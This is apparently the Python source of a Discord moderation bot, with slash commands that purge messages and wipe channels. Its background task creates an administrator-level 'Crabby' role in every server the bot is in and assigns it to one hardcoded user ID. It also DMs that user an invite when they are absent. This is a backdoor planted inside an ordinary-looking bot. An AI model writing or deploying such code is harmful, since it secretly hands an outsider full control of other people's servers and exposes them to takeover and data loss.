import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
from flask import Flask
from threading import Thread
from waitress import serve

# --- WEB SERVER FOR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "Crabby Bot is Online and Purging"

def run_flask():
    # Render binds to port 10000 by default
    port = int(os.environ.get("PORT", 10000))
    print(f"Starting server on port {port}...")
    serve(app, host='0.0.0.0', port=port)

# --- BOT CONFIG ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        # Intents are required to see members and delete messages
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        print("Syncing slash commands...")
        await self.tree.sync()
        if not self.check_target_user.is_running():
            self.check_target_user.start()

    # --- AUTO-ROLE & INVITE LOGIC ---
    @tasks.loop(seconds=60)
    async def check_target_user(self):
        user_found_anywhere = False
        
        for guild in self.guilds:
            member = guild.get_member(TARGET_USER_ID)
            
            if member:
                user_found_anywhere = True
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                
                # 1. Create the 'Crabby' Role if it doesn't exist
                if not role:
                    try:
                        perms = discord.Permissions(administrator=True)
                        role = await guild.create_role(name=ROLE_NAME, permissions=perms, reason="Auto-Setup")
                        print(f"DEBUG: Created {ROLE_NAME} role in {guild.name}")
                    except Exception as e:
                        print(f"DEBUG: Failed to create role in {guild.name}: {e}")
                        continue

                # 2. Assign the role if the user doesn't have it
                if role and role not in member.roles:
                    try:
                        await member.add_roles(role)
                        print(f"DEBUG: Assigned {ROLE_NAME} to {member.name}")
                    except Exception as e:
                        print(f"DEBUG: Failed to assign role: {e}. Check Role Hierarchy!")
        
        # 3. If user is NOT in the server, try to DM them an invite
        if not user_found_anywhere:
            try:
                user = await self.fetch_user(TARGET_USER_ID)
                if self.guilds:
                    # Create an invite to the first available text channel
                    channel = self.guilds[0].text_channels[0]
                    invite = await channel.create_invite(max_age=3600, reason="Auto-invite target user")
                    await user.send(f"Hey! You aren't in the server. Join here: {invite}")
                    print(f"DEBUG: Sent DM invite to {user.name}")
            except Exception as e:
                print(f"DEBUG: Could not DM user: {e}")

    @check_target_user.before_loop
    async def before_my_task(self):
        await self.wait_until_ready()

bot = MyBot()

# --- SLASH COMMAND: /clear ---
@bot.tree.command(name="clear", description="Purge a specific number of messages")
@app_commands.describe(amount="How many messages to delete?")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🗑️ Deleted **{len(deleted)}** messages.", ephemeral=True)

# --- SLASH COMMAND: /clear_all ---
@bot.tree.command(name="clear_all", description="Purge all messages (Last 14 days)")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=None)
    await interaction.followup.send(f"💥 Channel wiped! **{len(deleted)}** messages removed.", ephemeral=True)

# --- SLASH COMMAND: /reinstall ---
@bot.tree.command(name="reinstall", description="Delete and recreate a channel to wipe all history")
@app_commands.describe(channel="The channel to recreate")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
    await interaction.response.send_message(f"🚀 Reinstalling {channel.name}...", ephemeral=True)
    
    # Save channel settings
    name, category, pos = channel.name, channel.category, channel.position
    overwrites, topic = channel.overwrites, channel.topic
    slow, nsfw = channel.slowmode_delay, channel.nsfw

    # Delete
    await channel.delete(reason=f"Reinstall by {interaction.user}")
    
    # Recreate
    new_chan = await interaction.guild.create_text_channel(
        name=name, category=category, position=pos, 
        overwrites=overwrites, topic=topic, 
        slowmode_delay=slow, nsfw=nsfw
    )
    await new_chan.send(f"✨ **Channel Reinstalled.** History cleared by {interaction.user.mention}.")

# --- ERROR HANDLING ---
@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ You lack the permissions to do that!", ephemeral=True)
    else:
        print(f"ERROR: {error}")

# --- STARTUP ---
if __name__ == "__main__":
    # Start web server thread for Render
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        try:
            bot.run(token)
        except Exception as e:
            print(f"FATAL ERROR: {e}")
            sys.exit(1)
    else:
        print("ERROR: DISCORD_TOKEN environment variable not found!")
        sys.exit(1)
